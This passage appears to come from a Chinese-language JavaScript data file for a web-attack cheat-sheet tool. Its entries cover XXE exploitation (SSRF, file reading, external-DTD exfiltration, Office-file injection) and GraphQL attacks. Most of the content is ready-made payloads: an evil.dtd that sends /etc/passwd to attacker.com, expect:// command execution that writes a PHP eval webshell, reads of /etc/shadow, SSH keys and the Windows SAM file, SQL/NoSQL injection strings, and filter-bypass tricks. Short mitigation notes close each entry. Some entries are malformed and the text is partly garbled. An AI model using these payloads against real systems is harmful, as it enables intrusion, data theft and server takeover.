    category: 'XXE实体注入',
    subCategory: 'XXE+SSRF',
    tags: ['xxe', 'ssrf', 'combination', 'xml'],
    prerequisites: ['存在XXE漏�', '内网可访问'],
    execution: [
      { 
        title: '1. 扫描内网端口', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "http://192.168.1.1:22">\n]>\n<foo>&xxe;</foo>\n\n# 批量扫描\n<!ENTITY xxe SYSTEM "http://192.168.1.1:80">\n<!ENTITY xxe SYSTEM "http://192.168.1.1:443">',
        syntaxBreakdown: [
          { part: '<!ENTITY xxe SYSTEM', explanation: '定义外部通用实体，支持多种协议', type: 'command' },
          { part: '"http://192.168.1.1:22"', explanation: '目标内网IP和端口，通过响应差异判断端口状态', type: 'value' },
          { part: '&xxe;', explanation: '在XML内容中引用实体触发HTTP请求', type: 'operator' }
        ], 
        description: '扫描内网端口', 
        platform: 'all'
      },
      { 
        title: '2. 访问内网服务', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/info">\n]>\n<foo>&xxe;</foo>\n\n# 访问Redis\n# 访问内部API',
        syntaxBreakdown: [
          { part: '<!DOCTYPE>', explanation: '文档类型声明', type: 'tag' },
          { part: '<!ENTITY>', explanation: '实体定义', type: 'tag' },
          { part: 'SYSTEM', explanation: '外部实体引用', type: 'keyword' },
          { part: 'http://', explanation: 'HTTP协议', type: 'technique' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '使用不同编码格式绕过IP过滤',
        syntaxBreakdown: [
          { part: 'IP编码', explanation: '使用十进制(2130706433)、十六进制(0x7f000001)、八进制(0177.0.0.1)绕过', type: 'command' },
          { part: 'URL编码', explanation: '对URL进行单次或双重URL编码绕过过滤', type: 'parameter' }
        ], 
        description: '编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'XXE SSRF利用XML外部实体发起服务端请求，可探测和访问内网服务、云元数据API、本地端口等，将XXE漏洞的影响范围从XML解析器所在服务器扩展到整个内网环境。',
      vulnerability: 'XXE SSRF通过SYSTEM实体引用内网URL：<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">获取云元数据、http://internal-service:8080/admin访问内网管理接口、http://127.0.0.1:port/进行端口扫描等。',
      exploitation: '完�利用流程：\n1. 发现XXE漏�\n2. 构造SSRF payload\n3. 访问内网服务\n4. 获取敏感信息',
      mitigation: '防御XXE SSRF：禁用外部实体处理，配置网络分段限制XML解析服务器的网络访问范围，阻止对元数据服务(169.254.169.254)的请求，启用IMDSv2(AWS)要求Token认证，监控异常内网HTTP请求。',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xxe-rce',
    name: 'XXE到RCE',
    description: '利用XXE实现远程代码执行',
    category: 'XXE实体注入',
    subCategory: 'XXE到RCE',
    tags: ['xxe', 'rce', 'php', 'expect'],
    prerequisites: ['存在XXE漏�', 'PHP expect扩展加载'],
    execution: [
      { 
        title: '1. Expect扩展RCE', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "expect://whoami">\n]>\n<foo>&xxe;</foo>\n\n# 执行任意命令\n<!ENTITY xxe SYSTEM "expect://id">\n<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">', 
        description: '使用expect协议执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'expect://', explanation: 'PHP expect协议' },
          { part: 'whoami', explanation: '要执行的命令' }
        ]
      },
      { 
        title: '2. 写入WebShell', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "expect://echo \'<?php eval($_POST[cmd]);?>\' > /var/www/html/shell.php">\n]>\n<foo>&xxe;</foo>',
        },
      ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '使用Base64或其他编码绕过命令过滤',
            syntaxBreakdown: [
              { part: '使用Base64或其他编码绕过命令过滤', explanation: '攻击载荷', type: 'value' }
            ],
        description: '编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'XXE远程代码执行在特定环境下可实现：PHP的expect://协议直接执行命令、通过XXE写入WebShell文件、利用XXE SSRF攻击内网服务(如Redis)间接RCE，以及通过Java反序列化与XXE组合攻击。',
      vulnerability: 'XXE RCE利用路径：1)PHP expect://包装器(<!ENTITY rce SYSTEM "expect://whoami">) 2)结合文件上传写入WebShell 3)XXE SSRF→gopher://攻击内网Redis/MySQL实现RCE 4)Java环境下XXE触发反序列化漏洞。',
      exploitation: '完�利用流程：\n1. 确认expect扩展可用\n2. 构造expect协议payload\n3. 执行系统命令\n4. 获取Shell',
      mitigation: '防御XXE RCE：禁用外部实体和所有PHP流包装器，删除不必要的PHP扩展(如expect)，严格的文件系统权限防止写入Web目录，网络隔离限制XML解析服务器的网络访问，定期更新XML解析库版本。',
      difficulty: 'advanced'
    }
  },
  {
    id: 'xxe-file-read',
    name: 'XXE文件读取',
    description: '利用XXE读取服务器文件',
    category: 'XXE实体注入',
    subCategory: '文件读取',
    tags: ['xxe', 'file', 'read', 'lfi'],
    prerequisites: ['存在XXE漏�', '有文件读取权限'],
    execution: [
      { 
        title: '1. 读取Linux文件', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<foo>&xxe;</foo>\n\n# 其他敏感文件\nfile:///etc/shadow\nfile:///etc/hosts\nfile:///root/.ssh/id_rsa\nfile:///proc/self/environ', 
        description: '读取Linux系统文件', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'file://', explanation: '本地文件协议' },
          { part: '/etc/passwd', explanation: '用户信息文件' }
        ]
      },
      { 
        title: '2. 读取Windows文件', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\n]>\n<foo>&xxe;</foo>\n\n# 其他敏感文件\nfile:///c:/windows/system32/config/sam\nfile:///c:/users/administrator/.ssh/id_rsa',
            syntaxBreakdown: [
              { part: '<?xml version="1.0"?>', explanation: 'XML声明/实体定义', type: 'tag' },
              { part: '<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">', explanation: 'XML声明/实体定义', type: 'tag' },
              { part: '\n]>\n<foo>&xxe;</foo>\n\n# 其他敏感文件\nfile:///c:/windows/syste', explanation: 'XML内容', type: 'value' }
            ],
        description: '读取Windows系统文件', 
        platform: 'windows'
      },
      { 
        title: '3. 读取Web配置', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">\n]>\n<foo>&xxe;</foo>\n\n# 常见配置文件\nfile:///var/www/html/wp-config.php\nfile:///app/.env\nfile:///app/config/database.yml',
            syntaxBreakdown: [
              { part: '<?xml version="1.0"?>', explanation: 'XML声明/实体定义', type: 'tag' },
              { part: '<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">', explanation: 'XML声明/实体定义', type: 'tag' },
              { part: '\n]>\n<foo>&xxe;</foo>\n\n# 常见配置文件\nfile:///var/www/html/wp-', explanation: 'XML内容', type: 'value' }
            ],
        description: '读取Web应用配置', 
        platform: 'all'
      },
      { 
        title: '4. 读取源代码', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">\n]>\n<foo>&xxe;</foo>',
            syntaxBreakdown: [
              { part: '<?xml version="1.0"?>', explanation: 'XML声明/实体定义', type: 'tag' },
              { part: '<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resourc', explanation: 'XML声明/实体定义', type: 'tag' },
              { part: '\n]>\n<foo>&xxe;</foo>', explanation: 'XML内容', type: 'value' }
            ],
        description: '使用PHP Filter读取源码', 
        },
      ],
    wafBypass: [
      { 
        title: '使用参数实体', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">\n<!ENTITY bar "%xxe;">\n]>\n<foo>&bar;</foo>',
            syntaxBreakdown: [
              { part: '<?xml version="1.0"?>', explanation: 'XML声明/实体定义', type: 'tag' },
              { part: '<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">', explanation: 'XML声明/实体定义', type: 'tag' },
              { part: '<!ENTITY bar "%xxe;">', explanation: 'XML声明/实体定义', type: 'tag' },
              { part: '\n]>\n<foo>&bar;</foo>', explanation: 'XML内容', type: 'value' }
            ],
        description: '参数实体绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'XXE文件读取是XXE漏洞最基础的利用方式，通过file://协议定义外部实体读取服务器本地文件。直接回显方式可在响应中看到文件内容，是XXE漏洞验证和信息收集的首要步骤。',
      vulnerability: 'XXE文件读取使用file://协议：<!ENTITY file SYSTEM "file:///etc/passwd">。可读取的关键文件包括系统配置(/etc/passwd,/etc/hosts)、应用源码、数据库配置(含密码)、SSH密钥等。二进制文件需使用PHP的php://filter/base64进行编码读取。',
      exploitation: '完�利用流程：\n1. 发现XXE漏�\n2. 构造文件读取payload\n3. 读取敏感文件\n4. 获取凭据信息',
      mitigation: '防御XXE文件读取：在XML解析器配置中禁用外部实体(如Java的setFeature DISALLOW_DOCTYPE)，使用安全的XML库(如defusedxml for Python)，最小化运行XML解析进程的系统权限，将敏感文件权限设为仅owner可读。',
      difficulty: 'beginner'
    }
  },
  {
    id: 'xxe-dtd',
    name: 'XXE外部DTD利用',
    description: '利用外部DTD文件进行XXE攻击',
    category: 'XXE实体注入',
    subCategory: '外部DTD',
    tags: ['xxe', 'dtd', 'external', 'xml'],
    prerequisites: ['存在XXE漏�', '可访问外部DTD'],
    execution: [
      { 
        title: '1. 托管恶意DTD', 
        command: '# 在攻击者服务器创建evil.dtd\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?d=%file;\'>">\n%eval;\n%exfil;',
        syntaxBreakdown: [
          { part: '<!ENTITY % file SYSTEM "file:///etc/passwd">', explanation: '参数实体读取目标系统文件', type: 'command' },
          { part: '&#x25;', explanation: '%的HTML实体编码，在实体定义中引用其他参数实体', type: 'operator' },
          { part: 'http://attacker.com/?d=%file;', explanation: '通过HTTP请求参数外带文件内容', type: 'value' }
        ], 
        description: '创建恶意DTD文件', 
        platform: 'all'
      },
      { 
        title: '2. 引用外部DTD', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">\n%xxe;\n]>\n<foo>test</foo>',
        syntaxBreakdown: [
          { part: '<!DOCTYPE foo [', explanation: 'DTD声明块开始', type: 'command' },
          { part: '<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">', explanation: '定义参数实体指向远程恶意DTD文件', type: 'command' },
          { part: '%xxe;', explanation: '展开参数实体，加载并执行远程DTD中的定义', type: 'operator' }
        ], 
        description: '引用外部DTD文件', 
        platform: 'all'
      },
      { 
        title: '3. 多步骤外带', 
        command: '# evil.dtd - 多步骤外带\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % start "<![CDATA[">\n<!ENTITY % end "]]>">\n<!ENTITY % all "%start;%file;%end;">',
        syntaxBreakdown: [
          { part: '<![CDATA[', explanation: 'CDATA开始标记，处理文件中的XML特殊字符', type: 'operator' },
          { part: '%start;%file;%end;', explanation: '拼接CDATA标记和文件内容，避免XML解析错误', type: 'variable' },
          { part: '%all;', explanation: '展开包含完整CDATA包裹数据的实体', type: 'operator' }
        ], 
        description: '处理特殊字符', 
        platform: 'all'
      },
      { 
        title: '4. 错误消息泄露', 
        command: '# 利用错误消息泄露数据\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">\n%eval;\n%error;\n\n# 错误消息中会包含文件内容',
        syntaxBreakdown: [
          { part: 'file:///nonexistent/%file;', explanation: '引用不存在的文件路径触发错误', type: 'value' },
          { part: '%error;', explanation: '展开错误实体，错误消息中包含%file的内容', type: 'operator' },
          { part: '错误消息', explanation: 'XML解析器的错误消息中会泄露文件内容', type: 'parameter' }
        ], 
        description: '错误消息外带', 
        },
      ],
    wafBypass: [
      { 
        title: '使用HTTPS', 
        command: '使用HTTPS托管DTD文件绕过HTTP过滤',
        syntaxBreakdown: [
          { part: 'HTTPS', explanation: '使用加密的HTTPS协议托管DTD，绕过HTTP流量检测', type: 'command' },
          { part: 'SSL/TLS', explanation: '加密传输使WAF无法检查DTD文件内容', type: 'parameter' }
        ], 
        description: 'HTTPS绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'XXE DTD攻击利用文档类型定义(DTD)中的实体声明功能，通过内部DTD或加载外部DTD文件来定义和利用恶意实体。外部DTD方式可绕过某些解析器对内部DTD中参数实体嵌套的限制。',
      vulnerability: 'XXE DTD利用方式：1)内部DTD直接声明SYSTEM实体读取文件 2)外部DTD加载攻击者服务器上的恶意DTD文件 3)利用本地DTD文件重新定义实体(适用于禁止外部DTD加载的环境) 4)参数实体嵌套实现复杂的数据外泄操作。',
      exploitation: '完�利用流程：\n1. 创建恶意DTD文件\n2. 托管在攻击者服务器\n3. 构造XXE引用DTD\n4. 触发外带获取数据',
      mitigation: '防御XXE DTD：完全禁用DTD处理(disallow-doctype-decl=true)，禁止加载外部DTD文件，如必须使用DTD则仅允许特定的本地DTD，WAF检测并拦截包含DOCTYPE声明的XML请求，使用不支持DTD的轻量级XML解析模式。',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xxe-xlsx',
    name: 'XLSX文件XXE',
    description: '利用XLSX文件进行XXE攻击',
    category: 'XXE实体注入',
    subCategory: 'XLSX文件XXE',
    tags: ['xxe', 'xlsx', 'excel', 'office'],
    prerequisites: ['应用解析XLSX文件', '存在XXE漏�'],
    execution: [
      { 
        title: '1. 解压XLSX文件', 
        command: '# XLSX本�是ZIP文件\nunzip spreadsheet.xlsx\n\n# 主要文件结构\nxl/workbook.xml\nxl/worksheets/sheet1.xml\nxl/sharedStrings.xml\n[Content_Types].xml',
        syntaxBreakdown: [
          { part: 'unzip spreadsheet.xlsx', explanation: 'XLSX是ZIP压缩包，直接解压获取内部XML文件', type: 'command' },
          { part: 'xl/workbook.xml', explanation: '工作簿主配置文件，包含Sheet信息', type: 'value' },
          { part: 'xl/worksheets/sheet1.xml', explanation: '工作表数据文件，包含单元格内容', type: 'value' },
          { part: '[Content_Types].xml', explanation: '内容类型定义文件，也可作为XXE注入点', type: 'value' }
        ], 
        description: '解压XLSX文件', 
        platform: 'all'
      },
      { 
        title: '2. 注入XXE Payload', 
        command: '# 修改xl/workbook.xml\n<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<workbook xmlns="...">\n&xxe;\n</workbook>',
        syntaxBreakdown: [
          { part: '<!DOCTYPE>', explanation: '文档类型声明', type: 'tag' },
          { part: '<!ENTITY>', explanation: '实体定义', type: 'tag' },
          { part: 'SYSTEM', explanation: '外部实体引用', type: 'keyword' },
          { part: 'file://', explanation: '本地文件协议', type: 'technique' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '修改Content_Types', 
        command: '修改[Content_Types].xml注入XXE',
        syntaxBreakdown: [
          { part: '[Content_Types].xml', explanation: 'XLSX中的内容类型定义文件，常被忽略', type: 'value' },
          { part: 'XXE注入', explanation: '在此文件中注入XXE，绕过仅检查workbook.xml的WAF', type: 'command' }
        ], 
        description: '修改Content_Types', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'XLSX文件本质上是ZIP压缩包内的多个XML文件，上传恶意XLSX文件可触发服务端XML解析器的XXE漏洞。Office文档处理、数据导入、报表系统等功能是常见的攻击入口。',
      vulnerability: 'XLSX XXE利用步骤：将XLSX文件解压→在xl/workbook.xml或[Content_Types].xml等XML文件中注入XXE实体声明→重新压缩为XLSX→上传到目标系统。当服务端使用不安全的XML解析器处理XLSX时触发XXE读取文件或SSRF。',
      exploitation: '完�利用流程：\n1. 解压XLSX文件\n2. 注入XXE payload\n3. 重新打包\n4. 上传触发漏�',
      mitigation: '防御XLSX XXE：使用安全配置的XML解析库处理Office文档，在解析前验证XLSX文件结构并剥离DTD声明，使用专用的Office文档处理库(如Apache POI配置禁用外部实体)，对上传文件进行沙箱解析。',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xxe-docx',
    name: 'DOCX文件XXE',
    description: '利用DOCX文件进行XXE攻击',
    category: 'XXE实体注入',
    subCategory: 'DOCX文件XXE',
    tags: ['xxe', 'docx', 'word', 'office'],
    prerequisites: ['应用解析DOCX文件', '存在XXE漏�'],
    execution: [
      { 
        title: '1. 解压DOCX文件', 
        command: '# DOCX本�是ZIP文件\nunzip document.docx\n\n# 主要文件结构\nword/document.xml\nword/_rels/document.xml.rels\n[Content_Types].xml',
        syntaxBreakdown: [
          { part: 'unzip document.docx', explanation: 'DOCX是ZIP压缩包，解压获取内部XML', type: 'command' },
          { part: 'word/document.xml', explanation: '主文档内容文件，核心注入点', type: 'value' },
          { part: 'word/_rels/document.xml.rels', explanation: '文档关系文件，也可作为注入点', type: 'value' },
          { part: '[Content_Types].xml', explanation: '内容类型定义，备选注入点', type: 'value' }
        ], 
        description: '解压DOCX文件', 
        platform: 'all'
      },
      { 
        title: '2. 注入XXE Payload', 
        command: '# 修改word/document.xml\n<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<w:document xmlns:w="...">\n<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>\n</w:document>',
      }
    ],
    wafBypass: [
      { 
        title: '修改关系文件', 
        command: '修改_rels/.rels或document.xml.rels注入XXE',
        syntaxBreakdown: [
          { part: '_rels/.rels', explanation: 'DOCX根关系文件，定义文档各部分的关联', type: 'value' },
          { part: 'document.xml.rels', explanation: '文档关系文件，常被WAF忽略的注入点', type: 'value' },
          { part: 'XXE注入', explanation: '在关系文件中注入XXE实体绕过内容检测', type: 'command' }
        ], 
        description: '修改关系文件', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'DOCX文件与XLSX类似是基于XML的Office Open XML格式，通过修改其中的XML文件注入XXE实体，可在文档处理系统(在线预览/格式转换/内容提取)中触发服务端XXE漏洞。',
      vulnerability: 'DOCX XXE注入点包括：word/document.xml(主文档内容)、[Content_Types].xml(内容类型定义)、word/_rels/.rels(关系定义)等XML文件。在线文档预览服务、文件格式转换API、简历解析系统等都是高风险攻击面。',
      exploitation: '完�利用流程：\n1. 解压DOCX文件\n2. 注入XXE payload\n3. 重新打包\n4. 上传触发漏�',
      mitigation: '防御DOCX XXE：与XLSX防御相同，使用安全配置的XML解析器，禁用外部实体，对用户上传的Office文档进行预处理(剥离DTD/实体声明)，在隔离环境中处理不可信文档，限制文档处理进程的网络和文件访问权限。',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'graphql-injection',
    name: 'GraphQL注入攻击',
    description: 'GraphQL API注入与信息泄露攻击',
    category: 'API安全',
    subCategory: 'GraphQL',
    tags: ['graphql', 'api', 'injection', 'introspection'],
    prerequisites: ['目标使用GraphQL API', '存在未授权访问或注入点'],
    execution: [
      { 
        title: '1. 探测GraphQL端点', 
        command: '# 常见GraphQL端点\n/graphql\n/api/graphql\n/graphql/api\n/query\n/graphql.php\n\n# 发送POST请求\ncurl -X POST http://target.com/graphql \\\n  -H "Content-Type: application/json" \\\n  -d \'{"query": "{ __schema { types { name } } }"}\'', 
        description: '探测GraphQL端点', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '__schema', explanation: 'GraphQL元数据查询' },
          { part: 'types', explanation: '获取所有类型定义' }
        ]
      },
      { 
        title: '2. 内省查询', 
        command: '# 完�内省查询\n{\n  __schema {\n    types {\n      name\n      kind\n      description\n      fields {\n        name\n        type {\n          name\n        }\n        args {\n          name\n          type {\n            name\n          }\n        }\n      }\n    }\n  }\n}\n\n# 使用工具\ngqlscan -u http://target.com/graphql\ninql -t http://target.com/graphql', 
        description: '执行内省查询获取API结构', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '__schema', explanation: '获取�个API架构' },
          { part: 'fields', explanation: '获取类型的所有字段' },
          { part: 'args', explanation: '获取字段参数' }
        ]
      },
      { 
        title: '3. 批量查询攻击', 
        command: '# 别名批量查询\n{\n  user1: user(id: 1) { name email }\n  user2: user(id: 2) { name email }\n  user3: user(id: 3) { name email }\n  user4: user(id: 4) { name email }\n}\n\n# 批量查询绕过速率限制\n[\n  {"query": "{ user(id: 1) { name } }"},\n  {"query": "{ user(id: 2) { name } }"},\n  {"query": "{ user(id: 3) { name } }"}\n]', 
        description: '使用批量查询绕过限制', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'user1: user(id: 1)', explanation: '使用别名同时查询多个用户' },
          { part: '[{},{},{}]', explanation: '数组形式批量查询' }
        ]
      },
      { 
        title: '4. SQL注入', 
        command: '# GraphQL中的SQL注入\n{\n  user(name: "admin\' OR \'1\'=\'1") {\n    id\n    name\n    password\n  }\n}\n\n# 通过参数注入\nmutation {\n  createUser(input: {\n    name: "test\' OR 1=1--"\n  }) {\n    id\n  }\n}', 
        description: 'GraphQL中的SQL注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '# GraphQL中的SQL注入\n{\n  user(na', explanation: '利用载荷', type: 'value' }
        ]
      },
      { 
        title: '5. NoSQL注入', 
        command: '# MongoDB注入\n{\n  user(filter: {\n    $or: [{name: "admin"}, {name: "root"}]\n  }) {\n    name\n    password\n  }\n}\n\n# 通过JSON注入\n{\n  search(text: "{\\"$ne\\": \\"\\"}") {\n    results\n  }\n}', 
        description: 'GraphQL中的NoSQL注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '$or', explanation: 'MongoDB逻辑运算符' },
          { part: '$ne', explanation: '不等于操作符' }
        ]
      },
      { 
        title: '6. 信息泄露', 
        command: '# 获取隐藏字段\n{\n  user(id: 1) {\n    name\n    email\n    password\n    apiKey\n    secretKey\n    token\n    __typename\n  }\n}\n\n# 枚举所有可能字段\n{\n  __type(name: "User") {\n    fields {\n      name\n      type {\n        name\n        kind\n      }\n    }\n  }\n}', 
        description: '获取隐藏字段和敏感信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '__typename', explanation: '获取对象类型名称' },
          { part: '__type', explanation: '查询特定类型信息' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '字段建议绕过', 
        command: '# 利用字段建议功能\nquery {\n  userr(id: 1) { name }\n}\n# 返回: Did you mean "user"?\n\n# 枚举隐藏字段\nquery {\n  user(id: 1) {\n    __typename\n    ...on AdminUser {\n      adminSecret\n    }\n  }\n}', 
        description: '利用字段建议和片段枚举', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '...on AdminUser', explanation: 'GraphQL内联片段' }
        ]
      },
      { 
        title: '指令注入', 
        command: '# 使用指令绕过\nquery {\n  user(id: 1) @deprecated {\n    name\n  }\n}\n\n# 自定义指令攻击\nmutation @skip(if: false) {\n  deleteUser(id: 1)\n}', 
        description: '使用GraphQL指令绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '@deprecated', explanation: '弃用指令' },
          { part: '@skip', explanation: '条件跳过指令' }
        ]
      }
    ],
    tutorial: {
      overview: 'GraphQL注入攻击利用GraphQL查询语言的灵活性进行信息泄露和数据操纵，包括深度嵌套查询(DoS)、字段建议泄露Schema信息、变量注入绕过查询限制、以及通过别名实现批量查询等。',
      vulnerability: 'GraphQL特有漏洞：1)嵌套查询DoS(深度嵌套导致指数级数据库查询) 2)字段建议泄露(拼写错误时返回相似字段名) 3)别名批量查询(一次请求查询数千条记录) 4)变量类型不匹配绕过输入校验 5)指令注入(@skip/@include滥用)。',
      exploitation: '完�利用流程：\n1. 探测GraphQL端点\n2. 执行内省查询获取API结构\n3. 分析敏感字段和操作\n4. 构造注入payload\n5. 批量查询绕过限制',
      mitigation: '防御措施：\n1. 生产环境禁用内省\n2. 实施输入验证\n3. 限制查询深度和复杂度\n4. 实施认证授权\n5. 限制批量查询',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'graphql-introspection',
    name: 'GraphQL内省攻击',
    description: '利用GraphQL内省功能获取API结构',
    category: 'API安全',
    subCategory: 'GraphQL内省',
    tags: ['graphql', 'introspection', 'enumeration', 'api'],
    prerequisites: ['目标使用GraphQL', '内省功能未禁用'],
    execution: [
      { 
        title: '1. 基础内省', 
        command: '# 获取所有类型\n{\n  __schema {\n    types {\n      name\n    }\n  }\n}\n\n# 获取查询类型\n{\n  __schema {\n    queryType {\n      name\n      fields {\n        name\n        description\n      }\n    }\n  }\n}', 
        description: '基础内省查询', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '__schema', explanation: 'GraphQL元数据根' },
          { part: 'queryType', explanation: '获取所有查询操作' }
        ]
      },
      { 
        title: '2. 完�内省', 
        command: '# 获取完�API结构\nquery IntrospectionQuery {\n  __schema {\n    queryType { name }\n    mutationType { name }\n    subscriptionType { name }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n            }\n          }\n        }\n      }\n    }\n  }\n}', 
        description: '完�内省查询获取所有信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'fragment', explanation: 'GraphQL片段定义' },
          { part: 'includeDeprecated', explanation: '包含已弃用字段' }
        ]
      },
      { 
        title: '3. 使用工具分析', 
        command: '# GraphQL Voyager - 可视化分析\n# https://github.com/APIs-guru/graphql-voyager\n\n# 使用CLI工具\nnpm install -g graphql-cli\ngraphql-cli introspect http://target.com/graphql\n\n# InQL扫描\npip install inql\ninql -t http://target.com/graphql\n\n# GraphQL Cop\nnpm install -g graphql-cop\ngraphql-cop -t http://target.com/graphql', 
        description: '使用工具分析GraphQL', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'https://github.com/APIs-guru/graphql-voyager\n\n#', explanation: '目标URL', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '绕过内省禁用', 
        command: '# 某些实现只检查特定字符串\n# 尝试不同格式\nquery { __schema { types { name } } }\nquery IntrospectionQuery { __schema { types { name } } }\n{"query":"{__schema{types{name}}}"\n\n# 使用GET请求\ncurl "http://target.com/graphql?query={__schema{types{name}}}"', 
        description: '绕过内省禁用检测', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://target.com/graphql?query={__schema{types{na', explanation: '目标URL', type: 'value' },
          { part: '# 某些实现只检查特定字符串\n# 尝试不同格式\nquer', explanation: '绕过技术', type: 'technique' }
        ]
      }
    ],
    tutorial: {
      overview: 'GraphQL内省(Introspection)是GraphQL规范内置的Schema自描述功能，允许客户端查询API的完整类型系统、字段定义和参数信息。在生产环境未禁用时将泄露所有API结构信息。',
      vulnerability: 'GraphQL内省通过__schema/__type查询获取：所有类型(Types)和字段(Fields)定义、查询(Query)/变更(Mutation)/订阅(Subscription)的完整接口、字段参数和返回类型、枚举值、接口和联合类型等，等同于泄露完整API文档。',
      exploitation: '完�利用流程：\n1. 发送内省查询\n2. 分析返回的API结构\n3. 识别敏感操作和字段\n4. 构造恶意查询',
      mitigation: '防御GraphQL内省泄露：在生产环境禁用内省查询(大多数GraphQL框架支持配置)，对__schema/__type查询实施访问控制(仅允许管理员)，使用查询白名单(Persisted Queries)限制可执行的查询，部署GraphQL网关进行查询分析。',
      difficulty: 'beginner'
    }
  },
  {
    id: 'graphql-batching',
    name: 'GraphQL批量查询攻击',
    description: '利用GraphQL批量查询绕过速率限制',
    category: 'API安全',
    subCategory: 'GraphQL批量查询',
    tags: ['graphql', 'batching', 'rate-limit', 'bypass'],
    prerequisites: ['目标使用GraphQL', '存在速率限制'],
    execution: [
      { 
        title: '1. 别名批量查询', 
        command: '# 使用别名一次查询多个用户\nquery {\n  user1: user(id: 1) { name email password }\n  user2: user(id: 2) { name email password }\n  user3: user(id: 3) { name email password }\n  user4: user(id: 4) { name email password }\n  user5: user(id: 5) { name email password }\n}\n\n# 批量枚举\nquery {\n  users: allUsers(limit: 1000) { id name email }\n}', 
        description: '使用别名批量查询', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'user1: user(id: 1)', explanation: '别名定义' },
          { part: 'limit: 1000', explanation: '限制返回数量' }
        ]
      },
      { 
        title: '2. 数组批量查询', 
